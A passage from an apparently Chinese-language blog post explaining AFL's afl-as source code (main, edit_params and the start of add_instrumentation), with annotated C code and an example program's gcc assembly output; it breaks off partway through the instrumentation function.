href="#main-1" class="headerlink" title="main"></a>main</h3><p>大致和 afl-gcc 的 main 差不多</p><ul><li>获取环境变量 AFL_INST_RATIO 赋值到 inst_ratio_str</li><li>输出 afl-as 版本信息</li><li>判断没有参数就退出</li><li>获取时间根据时间和进程号生成随机数种子</li><li>调用 edit_params 解析参数</li><li>inst_ratio_str 不在 0-100 则退出</li><li>获取环境变量 AS_LOOP_ENV_VAR 为 1 则退出，为 0 则设置为 1</li><li>如果存在环境变量 AFL_USE_ASAN &#x2F; AFL_USE_MSAN 则降低 inst_ratio_str 以降低 AFL 的覆盖率检测频率减少对程序性能的影响</li><li>调用 add_instrumentation 函数对程序进行插桩</li><li>fork 新进程使用 execvp 执行 afl_as &#x2F; as</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  u8<span class="token operator">*</span> inst_ratio_str <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_INST_RATIO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//AFL 的指令覆盖率,用于指定 AFL 在代码中插入覆盖率检测代码的比例</span>  <span class="token comment">//值的范围是 0 到 100，表示百分比</span>  <span class="token comment">//如果值为 100，表示 AFL 会在所有可能的指令位置插入覆盖率检测代码，这会提供最全面的覆盖率，但可能会显著降低程序的运行速度</span>  <span class="token comment">//如果值为 0，则表示不插入任何覆盖率检测代码，这通常用于非模糊测试场景</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  clang_mode <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span>CLANG_ENV_VAR<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_QUIET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span>cCYA <span class="token string">"afl-as "</span> cBRI VERSION cRST <span class="token string">" by &lt;lcamtuf@google.com>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> be_quiet <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">gettimeofday</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tz<span class="token punctuation">)</span><span class="token punctuation">;</span>  rand_seed <span class="token operator">=</span> tv<span class="token punctuation">.</span>tv_sec <span class="token operator">^</span> tv<span class="token punctuation">.</span>tv_usec <span class="token operator">^</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srandom</span><span class="token punctuation">(</span>rand_seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取时间生成随机数种子</span>  <span class="token function">edit_params</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//处理参数</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>inst_ratio_str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>inst_ratio_str<span class="token punctuation">,</span> <span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inst_ratio<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> inst_ratio <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Bad value of AFL_INST_RATIO (must be between 0 and 100)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//指令覆盖率不在 0-100 之间则报错</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>AS_LOOP_ENV_VAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//防止在调用 as（汇编器）时出现无限循环调用as</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Endless loop when calling 'as' (remove '.' from your PATH)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">setenv</span><span class="token punctuation">(</span>AS_LOOP_ENV_VAR<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为1表示已经被调用过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    sanitizer <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    inst_ratio <span class="token operator">/=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//降低 AFL 的覆盖率检测频率，以减少对程序性能的影响，同时让内存检测工具能够更有效地运行</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//AFL_USE_ASAN：启用 AddressSanitizer（ASan），一种内存错误检测工具,以检测堆栈和堆缓冲区上溢/下溢 释放之后的堆使用情况</span>    <span class="token comment">//AFL_USE_MSAN：启用 MemorySanitizer（MSan），一种未初始化内存检测工具</span>    <span class="token comment">//源码注释：使用 ASAN 进行编译时，我们没有特别优雅的方法来跳过特定于 ASAN 的分支。但我们可以通过概率来弥补这一点</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>just_version<span class="token punctuation">)</span> <span class="token function">add_instrumentation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序不是只需要输出版本信息的时候，对程序进行插桩</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">execvp</span><span class="token punctuation">(</span>as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>as_params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fork新建进程之后执行参数列表</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Oops, failed to execute '%s' - check your PATH"</span><span class="token punctuation">,</span> as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"waitpid() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_KEEP_ASSEMBLY"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">unlink</span><span class="token punctuation">(</span>modified_file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><p>处理参数、获取环境变量</p><ul><li>获取环境变量 AFL_AS 给 afl_as</li><li>依次获取环境变量TMPDIR &#x2F; 环境变量 TEMP &#x2F; 环境变量 TMP &#x2F; &#x2F;tmp，最先获取到的赋值给 tmp_dir</li><li>给 as_params 数组开辟空间，如果 afl_as 存在则将第一个参数设置为 afl_as，否则设置为 as</li><li>循环遍历参数函数参数，存在 –64 就设置 use_64bit 为 1，存在 –32 就设置 use_64bit 为 0，并且将参数添加到 as_params</li><li>从 as_params 中获取 input_file<ul><li>如果是 –version 则表示只需要输出版本信息，just_version 设置为 1</li><li>如果是 - 开头但不是 –version 则报错</li><li>如果只有 - 则输入文件为空</li></ul></li><li>如果 input_file 不以 tmp_dir &#x2F; &#x2F;var&#x2F;tmp&#x2F; &#x2F; &#x2F;tmp&#x2F; 开头，则设置 pass_thru 为 1，表示输入文件不是一个标准的编译过程中的临时文件，后续也不会进行插桩</li><li>生成修改后的文件路径：tmp_dir&#x2F;.afl-getpid()-time(NULL).s</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">edit_params</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 <span class="token operator">*</span>tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TMPDIR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>afl_as <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_AS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从环境变量中获取临时目录和 afl_as 的路径</span>  u32 i<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token comment">//源码注释翻译：虽然没有记录，但当未设置 TMPDIR 时，GCC 也会使用 TEMP 和 TMP。我们需要检查这些非标准变量，以便稍后正确处理 pass_thru 逻辑。</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TEMP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TMP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token string">"/tmp"</span><span class="token punctuation">;</span>  <span class="token comment">//设置 tmp_dir 为 环境变量 TMPDIE / TEMP / 环境变量TMP / /tmp（按优先级顺序获取，不存在则获取下一个）</span>  as_params <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>argc <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为 as 参数开辟空间</span>  as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> afl_as <span class="token operator">?</span> afl_as <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token comment">//存在 afl_as 就将第一个参数设置为 afl_as,不存在就设置为 as</span>  as_params<span class="token punctuation">[</span>argc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//将数组最后一位设置为 0 表示结束</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//循环遍历参数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"--64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> use_64bit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//参数存在 --64 就设置 use_64bit 为 1</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"--32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> use_64bit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//参数存在 --32 就设置 use_64bit 为 0</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>    as_params<span class="token punctuation">[</span>as_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//将参数赋值到参数列表数组中</span>  <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  input_file <span class="token operator">=</span> argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取 input_file</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>input_file <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"-version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//input_file = --version表示只需要显示版本信息</span>      just_version <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      modified_file <span class="token operator">=</span> input_file<span class="token punctuation">;</span>      <span class="token keyword">goto</span> wrap_things_up<span class="token punctuation">;</span><span class="token comment">//设置 just_version 为 1，输出文件为输入文件</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Incorrect use (not called through afl-gcc?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输入文件是 - 开头但不是 --version 则输出报错信息</span>      <span class="token keyword">else</span> input_file <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//输入文件是 - 则输入文件为空</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> tmp_dir<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp_dir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"/var/tmp/"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"/tmp/"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> pass_thru <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果 input_file 不以 tmp_dir / /var/tmp/ / /tmp/ 开头，则设置 pass_thru 为 1,用于判断输入文件是否是一个标准的编译过程中的临时文件，还是一个用户手动指定的 .s 文件（汇编文件）。如果是非标准路径，pass_thru 被设置为 1，表示需要特殊处理。</span>  <span class="token punctuation">&#125;</span>  modified_file <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.afl-%u-%u.s"</span><span class="token punctuation">,</span> tmp_dir<span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                               <span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成修改后的文件路径：tmp_dir/.afl-getpid()-time(NULL).s，例如 /tmp/.afl-12842-1741114189.s</span>wrap_things_up<span class="token operator">:</span>  as_params<span class="token punctuation">[</span>as_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> modified_file<span class="token punctuation">;</span>  as_params<span class="token punctuation">[</span>as_par_cnt<span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//将 modified_file 添加到参数列表 as_params 中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><ul><li>打开输入函数 &#x2F;tmp&#x2F;test.s 和输出函数 &#x2F;tmp&#x2F;.afl-12842-1741114189.s</li><li>逐行读取汇编代码，根据条件插入插桩程序<ul><li>如果当前行满足插桩条件则进行插桩并且增加插桩计数器</li><li>存入当前行汇编代码</li><li>在 text 段<ul><li>处理位数（32 &#x2F; 64），检测是 intel &#x2F; att 语法模式，检测是 APP &#x2F; NO_APP，根据检测结果设置 </li><li>skip_intel 和 skip_app 都是 0 且是条件跳转分支（存在：且开头是.?n） &#x2F; 函数入口标签(存在：)时设置 instrument_next 为 1，表示在下一条指令插入插桩代码</li></ul></li></ul></li><li>根据程序位数插入 main_payload_64 &#x2F; main_payload_32</li></ul><p>一个汇编程序的例子：</p><p>test.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> a <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"N"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc -S test.c -o test.s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>test.s</p><blockquote><p>LC：gcc 非分支标签L0：gcc 分支标签</p><p>.Ltmp0：clang非分支标签.LBB0_0：clang 分支标签</p><p>jnz foo：条件分支jmp foo：非条件跳转</p></blockquote><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.file&quot;test.c&quot;.text.section.rodata.LC0:.string&quot;Y&quot;.LC1:.string&quot;N&quot;.text.globltest.typetest, @functiontest:.LFB0:.cfi_startprocendbr64pushq%rbp.cfi_def_cfa_offset 16.cfi_offset 6, -16movq%rsp, %rbp.cfi_def_cfa_register 6subq$16, %rspmovl$1, -4(%rbp)cmpl$0, -4(%rbp)jg.L2leaq.LC0(%rip), %rdicallputs@PLTjmp.L1.L2:leaq.LC1(%rip), %rdicallputs@PLTnop.L1:leave.cfi_def_cfa 7, 8ret.cfi_endproc.LFE0:.sizetest, .-test.globlmain.typemain, @functionmain:.LFB1:.cfi_startprocendbr64pushq%rbp.cfi_def_cfa_offset 16.cfi_offset 6, -16movq%rsp, %rbp.cfi_def_cfa_register 6movl$0, %eaxcalltestmovl$0, %eaxpopq%rbp.cfi_def_cfa 7, 8ret.cfi_endproc.LFE1:.sizemain, .-main.ident&quot;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0&quot;.section.note.GNU-stack,&quot;&quot;,@progbits.section.note.gnu.property,&quot;a&quot;.align 8.long 1f - 0f.long 4f - 1f.long 50:.string &quot;GNU&quot;1:.align 8.long 0xc0000002.long 3f - 2f2:.long 0x33:.align 84:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>^</code> 是一个特殊字符，表示行的开头，用于匹配字符串或行的起始位置</p><p><code>\t</code>开头且第二个是字母的是 指令行</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">add_instrumentation</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    inf <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inf<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to read '%s'"</span><span class="token punctuation">,</span> input_file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> inf <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span><span class="token comment">//打开 input_file,文件为空则 fd 为 stdin 标准输入</span>  outfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>modified_file<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_EXCL <span class="token operator">|</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开 modified_file，即/tmp/test.s</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>outfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to write to '%s'"</span><span class="token punctuation">,</span> modified_file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开失败报错</span>  outf <span class="token operator">=</span> <span class="token function">fdopen</span><span class="token punctuation">(</span>outfd<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到 outf 这个 FILE* 指针，fdopen 函数将参数 fd 的文件描述符转化为文件指针，这里打开的是刚生成的文件 /tmp/.afl-12842-1741114189.s</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outf<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fdopen() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取失败则报错</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> MAX_LINE<span class="token punctuation">,</span> inf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//逐行从输入文件中读取</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pass_thru <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_intel <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_app <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>skip_csect <span class="token operator">&amp;&amp;</span> instr_ok <span class="token operator">&amp;&amp;</span>        instrument_next <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isalpha</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 